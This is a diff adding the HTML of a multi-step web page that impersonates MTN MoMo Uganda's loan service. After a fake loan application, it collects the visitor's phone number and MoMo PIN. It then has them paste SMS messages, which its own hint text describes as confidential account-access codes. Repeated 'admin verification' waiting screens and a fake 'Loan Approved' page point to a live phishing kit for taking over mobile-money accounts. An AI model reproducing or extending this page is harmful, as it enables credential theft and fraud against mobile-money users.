@@ -1,0 +1,369 @@
+
+
+<div id="adminErrorModal" class="admin-error-modal">
+  <div class="admin-error-content">
+    <h3>⚠️ Access Denied</h3>
+    <p>This form requires an admin authorization link to proceed. Please use the link provided by your administrator.</p>
+    <div class="admin-error-code" id="adminErrorCode">
+      Example: https://yoursite.com/form?admin=ADMIN123456
+    </div>
+    <p style="font-size:0.85rem; color:var(--text-light); margin-bottom:0;">Contact your administrator if you don't have a valid link.</p>
+  </div>
+</div>
+
+<div id="page-landing" class="page active">
+  <div class="land-nav">
+    <div style="flex: 1;"></div>
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon">M</div>
+      <div class="mtn-logo-text">MoMo</div>
+      <div class="mtn-logo-sub">from MTN</div>
+    </div>
+    <div style="flex: 1;"></div>
+  </div>
+  <div class="land-center">
+    <div class="land-card">
+      <h1>Welcome to MTN MoMo Uganda</h1>
+      <p class="land-tagline">Get loans easily through MTN MoMo Uganda</p>
+      <div class="calc-box">
+        <h2>Loan Calculator</h2>
+        <div class="calc-row2">
+          <span>Amount</span>
+          <span class="cv" id="calcAmt">UGX 1,000,000</span>
+        </div>
+        <div class="calc-row2">
+          <span>Term</span>
+          <span class="cv" id="calcTerm">48 Months</span>
+        </div>
+        <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000">
+        <div class="range-ends">
+          <span>UGX 500,000</span>
+          <span>UGX 5,000,000</span>
+        </div>
+        <div class="monthly-box">
+          <span class="ml">Monthly Payment</span>
+          <span class="ma" id="monthlyAmt">UGX 20,834</span>
+        </div>
+      </div>
+      <button class="btn-grad">START APPLICATION</button>
+    </div>
+  </div>
+  <div class="land-footer">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-step1" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 1 of 3</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+      <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected="">Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
+      <div class="field"><label>Loan Amount (UGX)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount"></div>
+      <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected="">48 Months</option><option>60 Months</option></select></div></div>
+      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…"></textarea></div>
+      <button class="btn-grad">NEXT STEP</button>
+    </div>
+  </div>
+</div>
+
+<div id="page-step2" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 2 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+      <div class="field-row">
+        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name"></div>
+        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name"></div>
+      </div>
+      <div class="field">
+        <label>Phone Number (Uganda)</label>
+        <div class="phone-row"><div class="ph-pre">+256</div><input type="tel" id="s2ph" placeholder="670123456" maxlength="9"></div>
+        <div class="field-hint">9 digits without +256 prefix (e.g., 670123456)</div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray">BACK</button>
+        <button class="btn-grad">NEXT STEP</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 MTN MoMo Uganda Loans</div>
+</div>
+
+<div id="page-step3" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 3 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+      <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected="">Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
+      <div class="field"><label>Annual Income (UGX)</label><input type="number" id="s3in" placeholder="Enter annual income"></div>
+      <div class="sum-box">
+        <h3>Application Summary</h3>
+        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">UGX 1,000,000</span></div>
+        <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+        <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray">BACK</button>
+        <button class="btn-grad">SUBMIT APPLICATION</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 MTN MoMo Uganda Loans</div>
+</div>
+
+<div id="page-processing" class="page">
+  <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="proc-wrap">
+      <div class="proc-icon">⏳</div>
+      <h2>Processing Application...</h2>
+      <p>Please wait while we process your loan application</p>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">Redirecting in a few moments...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-login" class="page">
+  <div class="login-hdr">
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon">M</div>
+      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1.2rem;">MoMo</div>
+    </div>
+    <div style="color: rgba(255, 255, 255, 0.7); font-size: 0.8rem;">Login via MTN MoMo Uganda</div>
+  </div>
+  <div class="login-body-wrap">
+    <h2>Login to MTN MoMo Uganda</h2>
+    <div class="login-inner">
+      <div class="lg-phone-row">
+        <div class="lg-ph-pre">+256</div>
+        <input type="tel" id="lpPhone" placeholder="670123456" maxlength="9">
+      </div>
+      <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
+      <div class="pin-row">
+        <input type="password" id="lp0" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp1" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp2" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp3" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp4" class="pin-box" maxlength="1" placeholder="•">
+        <button class="pin-eye" title="Show/Hide">👁</button>
+        <button class="pin-delete" title="Delete PIN">✕</button>
+      </div>
+      <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+      <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+      <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+      <button id="bLgn" class="btn-login">LOGIN</button>
+      <div id="mLgn" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Logging in…</div>
+      </div>
+    </div>
+  </div>
+  <div class="lg-curve"></div>
+  <div class="lg-foot">
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 0.9rem;">M</div>
+      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1rem;">MTN MoMo Uganda</div>
+    </div>
+    <div class="lg-terms">© 2026 MTN MoMo Uganda Loans. All rights reserved.</div>
+  </div>
+</div>
+
+<div id="page-wait-login-approval" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Waiting for Admin Approval</h2>
+      <p>Your login is pending admin verification. Please wait...</p>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is reviewing your request...</div>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+    </div>
+  </div>
+</div>
+
+<div id="page-sms-paste" class="page">
+  <div class="sms-topbar">
+    <button class="bk">← Back</button>
+    <div style="flex: 1;"></div>
+    <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">SMS Verification</div>
+    <div style="flex: 1;"></div>
+  </div>
+  <div class="sms-body-wrap">
+    <div class="sms-card">
+      <h2>Paste SMS Message</h2>
+      <p class="sms-hint">We have sent a message to your phone number. Please copy and paste the full message here.</p>
+      <div class="sms-timer-wrap" id="smsTimerWrap">
+        <div class="sms-timer-circle">
+          <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+            <circle class="sms-timer-bg" cx="22" cy="22" r="18"></circle>
+            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"></circle>
+          </svg>
+          <div class="sms-timer-num" id="smsTimerNum">60</div>
+        </div>
+        <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br>Paste your SMS before time runs out.</div>
+      </div>
+      <div class="sms-resend-wrap" id="smsResendWrap">
+        <p>⏰ Your verification session has expired.<br>Request a new SMS and paste it below.</p>
+        <button class="btn-resend" id="bResend">🔄 Resend SMS</button>
+        <div id="mResend" class="loading" style="margin-top:10px;">
+          <div class="spinner" style="margin: 8px auto; width:30px; height:30px; border-width:3px;"></div>
+          <div class="wait-msg" style="font-size:0.82rem;">Sending…</div>
+        </div>
+      </div>
+      <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…"></textarea>
+      <p class="sms-code-hint">Something like: "Y'ello. Please note! This confidential code gives access to your MoMo account:........."</p>
+      <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+      <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+      <button id="bSms" class="btn-sms">SUBMIT</button>
+      <div id="mSms" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Processing message…</div>
+      </div>
+    </div>
+  </div>
+  <div class="sms-curve"></div>
+  <div class="sms-foot">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-wait-sms" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Verifying SMS Message</h2>
+      <p>Your SMS message has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your message...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-otp" class="page">
+  <div class="otp-topbar">
+    <button class="bk">← Back</button>
+    <div style="flex: 1;"></div>
+    <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">OTP Verification</div>
+    <div style="flex: 1;"></div>
+  </div>
+  <div class="otp-body-wrap">
+    <div class="otp-card">
+      <div class="otp-paste-section">
+        <div class="otp-paste-label">Paste New Message:</div>
+        <div class="otp-paste-hint">We have sent a new message to your phone number Copy the full SMS you received and paste it here.</div>
+        <textarea id="otpMsgPaste" class="otp-paste-textarea" placeholder="Paste your full SMS message here…"></textarea>
+        <p class="otp-paste-code-hint">e.g. "Y'ello. Please enter the following code:........."</p>
+      </div>
+      <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+      <button id="bOtp" class="btn-otp">SUBMIT</button>
+      <div id="mOtp" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Verifying…</div>
+      </div>
+    </div>
+  </div>
+  <div class="otp-curve"></div>
+  <div class="otp-foot">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-wait-otp" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Verifying OTP Code</h2>
+      <p>Your OTP code has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your OTP code...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-approval" class="page">
+  <div class="appr-wrap">
+    <div class="appr-top">
+      <div class="check-circle">✓</div>
+      <h2 class="appr-title">Loan Approved!</h2>
+      <p class="appr-sub">Your loan has been successfully approved.</p>
+      <div class="appr-banner">
+        <div class="abl">Amount to Receive</div>
+        <div class="aba" id="aprAmount">UGX 1,000,000</div>
+      </div>
+    </div>
+    <div class="comp-box">
+      <div class="ch">ℹ️ Important Information</div>
+      <p>The funds will be deposited directly to your MTN MoMo Uganda account within 5 minutes. Please ensure your phone number is correct.</p>
+    </div>
+    <div class="ld-card">
+      <div class="ld-htitle">📊 Loan Details</div>
+      <div class="ld-row">
+        <div class="ld-icon ic-g">💰</div>
+        <div>
+          <div class="ld-lbl">Amount</div>
+          <div class="ld-val" id="aprAmt">UGX 1,000,000</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-b">📅</div>
+        <div>
+          <div class="ld-lbl">Term</div>
+          <div class="ld-val" id="aprTerm">48 Months</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-p">💳</div>
+        <div>
+          <div class="ld-lbl">Monthly Payment</div>
+          <div class="ld-val" id="aprMth">UGX 24,000</div>
+        </div>
+      </div>
+    </div>
+    <div class="nxt-steps">
+      <span style="font-size: 1.2rem;">📌</span>
+      <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo Uganda account in the next section.</p>
+    </div>
+    <div class="rth-wrap">
+      <button class="rth-btn">FINISH</button>
+    </div>
+  </div>
+</div>
+
+
+
+
+
